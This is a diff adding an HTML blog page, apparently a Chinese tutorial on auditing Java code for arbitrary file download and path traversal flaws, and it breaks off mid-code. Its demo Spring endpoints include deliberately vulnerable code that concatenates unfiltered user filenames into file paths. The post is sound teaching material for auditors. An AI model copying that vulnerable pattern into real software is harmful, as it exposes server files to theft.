@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="白给">
+    
+    <title>
+        
+            java代码审计之任意文件下载漏洞 |
+        
+        白给&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/64.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/64.jpg","favicon":"/images/64.jpg","avatar":"/images/64.jpg","font_size":null,"font_family":"STKaiti","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"This is the Way","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["炼气","筑基","结丹","元婴","化神"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/64.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               白给&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">java代码审计之任意文件下载漏洞</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/64.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">白给</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-04-15 15:48:06</span>
+        <span class="mobile">2023-04-15 15:48</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-04-15 15:48:46</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.7k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>16 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="一、任意文件下载漏洞"><a href="#一、任意文件下载漏洞" class="headerlink" title="一、任意文件下载漏洞"></a>一、任意文件下载漏洞</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>任意文件下载漏洞（Arbitrary File Download Vulnerability）是指攻击者可以通过应用程序中的漏洞，绕过访问控制，访问或下载服务器上的任意文件。这些文件可以包括敏感信息、配置文件、密码文件、源代码文件等。</p>
+<p>攻击者通常会利用应用程序中的输入验证或访问控制不严格的问题，构造出特定的URL或参数，通过传递特定的参数来执行任意文件下载攻击。攻击者可能会使用文件路径遍历（Directory Traversal）技术，尝试访问服务器上的任意文件。</p>
+<p>任意文件下载漏洞是一种常见的Web安全漏洞，它可能导致敏感信息泄露，甚至可以导致服务器被入侵控制。应用程序开发人员需要采取适当的安全措施来预防这种漏洞的发生，例如对用户输入进行严格验证、使用白名单机制、限制文件下载的路径等。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>任意文件下载漏洞的原理是攻击者利用应用程序的漏洞，以某种方式构造出能够绕过访问控制的请求，从而能够访问或下载服务器上的任意文件。</p>
+<p>攻击者通常会通过Web应用程序向服务器发送请求，例如GET或POST请求。攻击者可能会修改请求参数，通过特定的URL或参数，绕过应用程序的访问控制机制，获取应用程序的敏感信息或下载任意文件。</p>
+<p>常见的攻击方式包括：</p>
+<ol>
+<li>直接访问文件：攻击者通过特定的URL直接访问服务器上的文件，例如访问配置文件、日志文件、密码文件等。</li>
+<li>文件路径遍历：攻击者构造特定的请求参数，使用”..”符号来遍历目录，从而访问到服务器上的任意文件。</li>
+<li>文件包含漏洞：攻击者利用应用程序中的文件包含漏洞，向应用程序传递恶意文件路径，使得应用程序将恶意文件内容包含进来。</li>
+</ol>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>为了防止任意文件下载漏洞，开发者可以采取以下措施：</p>
+<ol>
+<li>输入验证：应用程序应该对所有输入进行严格的验证和过滤，确保请求参数符合预期的格式和内容，避免攻击者传递恶意参数，例如过滤..&#x2F;等字符。</li>
+<li>访问控制：应用程序需要限制用户对文件和目录的访问权限，确保用户只能够访问其具有权限的文件。最好的方式是使用白名单机制，只允许用户访问应用程序预定义的文件或目录。</li>
+<li>安全配置：服务器上的文件和目录需要采取适当的安全配置，例如限制文件下载的路径、禁止目录遍历、限制目录和文件的访问权限等。</li>
+</ol>
+<h2 id="二、任意文件下载漏洞代码审计"><a href="#二、任意文件下载漏洞代码审计" class="headerlink" title="二、任意文件下载漏洞代码审计"></a>二、任意文件下载漏洞代码审计</h2><p>注：以下分析均为后端代码分析，不涉及前端</p>
+<h3 id="1、查找文件下载功能点"><a href="#1、查找文件下载功能点" class="headerlink" title="1、查找文件下载功能点"></a>1、查找文件下载功能点</h3><p>以下为常见文件上传相关类及方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sun.nio.ch.FileChannelImpl</span><br><span class="line">java.io.File.list/listFiles</span><br><span class="line">java.io.FileInputStream</span><br><span class="line">java.io.FileOutputStream</span><br><span class="line">java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem</span><br><span class="line">sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider</span><br><span class="line">java.io.RandomAccessFile</span><br><span class="line">sun.nio.fs.CopyFile</span><br><span class="line">sun.nio.fs.UnixChannelFactory</span><br><span class="line">sun.nio.fs.WindowsChannelFactory</span><br><span class="line">java.nio.channels.AsynchronousFileChannel</span><br><span class="line">FileUtil/IOUtil</span><br><span class="line">filePath/download/deleteFile/move/getFile</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、审计下载功能代码"><a href="#2、审计下载功能代码" class="headerlink" title="2、审计下载功能代码"></a>2、审计下载功能代码</h3><p>任意文件下载漏洞从审计思路分为审计下载文件名是否可控，若文件名可控则存在通过 ..&#x2F; 进行路径穿越造成任意文件下载漏洞。</p>
+<p>文件下载从业务逻辑分为从本地文件下载和从远程服务器下载。</p>
+<h4 id="从本地服务器下载"><a href="#从本地服务器下载" class="headerlink" title="从本地服务器下载"></a>从本地服务器下载</h4><h5 id="文件名可控且可进行目录穿越"><a href="#文件名可控且可进行目录穿越" class="headerlink" title="文件名可控且可进行目录穿越"></a>文件名可控且可进行目录穿越</h5><p>从本地文件下载即从当前web服务器中下载文件。从代码实现逻辑分为</p>
+<p>1、获取要下载文件名后new File()文件所在路径，读取文件</p>
+<p>2、利用class.getResouceAsStream()获取web服务器根目录下文件</p>
+<h6 id="new-File"><a href="#new-File" class="headerlink" title="new File()"></a>new File()</h6><p>demo如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PROFILE</span> <span class="operator">=</span> <span class="string">&quot;F:\\file\\&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/download1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download1</span><span class="params">(String filename, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileaPath</span> <span class="operator">=</span> PROFILE + filename;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileaPath);</span><br><span class="line">        <span class="comment">// 获取文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fullfilename</span> <span class="operator">=</span> file.getName();</span><br><span class="line">        <span class="comment">// 获取文件后缀名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ext</span> <span class="operator">=</span> fullfilename.substring(fullfilename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>).toLowerCase();</span><br><span class="line">        <span class="comment">// 将文件写入输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[fis.available()];</span><br><span class="line">        fis.read(buffer);</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="comment">// 清空response</span></span><br><span class="line">        response.reset();</span><br><span class="line">        <span class="comment">// 设置response的Header</span></span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">//Content-Disposition的作用：告知浏览器以何种方式显示响应返回的文件，用浏览器打开还是以附件的形式下载到本地保存</span></span><br><span class="line">        <span class="comment">//attachment表示以附件方式下载   inline表示在线打开   &quot;Content-Disposition: inline; filename=文件名.mp3&quot;</span></span><br><span class="line">        <span class="comment">// filename表示文件的默认名称，因为网络传输只支持URL编码的相关支付，因此需要将文件名URL编码后进行传输,前端收到后需要反编码才能获取到真正的名称</span></span><br><span class="line">        response.addHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(fullfilename, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="comment">// 告知浏览器文件的大小</span></span><br><span class="line">        response.addHeader(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;&quot;</span> + file.length());</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(response.getOutputStream());</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        outputStream.write(buffer);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ex.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上代码中对前端传的filename参数直接进行路径拼接，且未对filename中特殊字符进行过滤，存在任意文件下载漏洞。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-0.png"
+                      alt="img"
+                ></p>
+<h6 id="getResouceAsStream"><a href="#getResouceAsStream" class="headerlink" title="getResouceAsStream()"></a>getResouceAsStream()</h6><p>getResouceAsStream()用于下载jar包内资源，demo如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/download2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download2</span><span class="params">(String filename, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取文件后缀名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ext</span> <span class="operator">=</span> filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>).toLowerCase();</span><br><span class="line">        <span class="comment">// 将文件写入输入流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getResourceAsStream(filename);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[fis.available()];</span><br><span class="line">        fis.read(buffer);</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 清空response</span></span><br><span class="line">        response.reset();</span><br><span class="line">        <span class="comment">// 设置response的Header</span></span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">//Content-Disposition的作用：告知浏览器以何种方式显示响应返回的文件，用浏览器打开还是以附件的形式下载到本地保存</span></span><br><span class="line">        <span class="comment">//attachment表示以附件方式下载   inline表示在线打开   &quot;Content-Disposition: inline; filename=文件名.mp3&quot;</span></span><br><span class="line">        <span class="comment">// filename表示文件的默认名称，因为网络传输只支持URL编码的相关支付，因此需要将文件名URL编码后进行传输,前端收到后需要反编码才能获取到真正的名称</span></span><br><span class="line">        response.addHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(filename, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="comment">// 告知浏览器文件的大小</span></span><br><span class="line">        response.addHeader(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;&quot;</span> + buffer.length);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(response.getOutputStream());</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        outputStream.write(buffer);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ex.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>项目目录如下：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-1.png"
+                      alt="img"
+                ></p>
+<p>可下载jar包内文件，此处为target文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-2.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-3.png"
+                      alt="img"
+                ></p>
+<p>无法跳出jar包下载文件，此处为target文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-4.png"
+                      alt="img"
+                ></p>
+<h5 id="文件名不可控"><a href="#文件名不可控" class="headerlink" title="文件名不可控"></a>文件名不可控</h5><p>文件名不可控即前端传入参数不为文件名，可为id,获取id后从数据库根据id搜索文件保存地址，然后从下载文件</p>
+<p>demo如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">FileMapper fileMapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/download3&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download3</span><span class="params">(String id, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//从数据库根据id搜索文件保存地址（此处可通过遍历id下载文件，可能存在越权下载）</span></span><br><span class="line">        QueryWrapper&lt;MyFile&gt; wrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        wrapper.eq(<span class="string">&quot;id&quot;</span>,id);</span><br><span class="line">        <span class="type">MyFile</span> <span class="variable">myFile</span> <span class="operator">=</span> fileMapper.selectOne(wrapper);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileaPath</span> <span class="operator">=</span> myFile.getFileUrl();</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileaPath);</span><br><span class="line">        <span class="comment">// 获取文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fullfilename</span> <span class="operator">=</span> file.getName();</span><br><span class="line">        <span class="comment">// 获取文件后缀名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ext</span> <span class="operator">=</span> fullfilename.substring(fullfilename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>).toLowerCase();</span><br><span class="line">        <span class="comment">// 将文件写入输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[fis.available()];</span><br><span class="line">        fis.read(buffer);</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="comment">// 清空response</span></span><br><span class="line">        response.reset();</span><br><span class="line">        <span class="comment">// 设置response的Header</span></span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">//Content-Disposition的作用：告知浏览器以何种方式显示响应返回的文件，用浏览器打开还是以附件的形式下载到本地保存</span></span><br><span class="line">        <span class="comment">//attachment表示以附件方式下载   inline表示在线打开   &quot;Content-Disposition: inline; filename=文件名.mp3&quot;</span></span><br><span class="line">        <span class="comment">// filename表示文件的默认名称，因为网络传输只支持URL编码的相关支付，因此需要将文件名URL编码后进行传输,前端收到后需要反编码才能获取到真正的名称</span></span><br><span class="line">        response.addHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(fullfilename, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="comment">// 告知浏览器文件的大小</span></span><br><span class="line">        response.addHeader(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;&quot;</span> + file.length());</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(response.getOutputStream());</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        outputStream.write(buffer);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ex.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>数据库内容如下：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-5.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-6.png"
+                      alt="img"
+                ></p>
+<p>文件名不可控则不存在任意文件下载漏洞</p>
+<h5 id="文件名可控不可进行目录穿越"><a href="#文件名可控不可进行目录穿越" class="headerlink" title="文件名可控不可进行目录穿越"></a>文件名可控不可进行目录穿越</h5><p>应用程序对文件名进行校验，存在恶意字符则不可下载，不存在任意文件下载漏洞</p>
+<p>demo如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/download4&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download4</span><span class="params">(String filename, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//对文件名进行校验</span></span><br><span class="line">        <span class="keyword">if</span> (!checkAllowDownload(filename))&#123;</span><br><span class="line">            response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">            response.getWriter().write(StrUtil.format(<span class="string">&quot;文件名称(&#123;&#125;)非法，不允许下载。 &quot;</span>, filename));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileaPath</span> <span class="operator">=</span> PROFILE + filename;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileaPath);</span><br><span class="line">        <span class="comment">// 获取文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fullfilename</span> <span class="operator">=</span> file.getName();</span><br><span class="line">        <span class="comment">// 获取文件后缀名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ext</span> <span class="operator">=</span> fullfilename.substring(fullfilename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>).toLowerCase();</span><br><span class="line">        <span class="comment">// 将文件写入输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        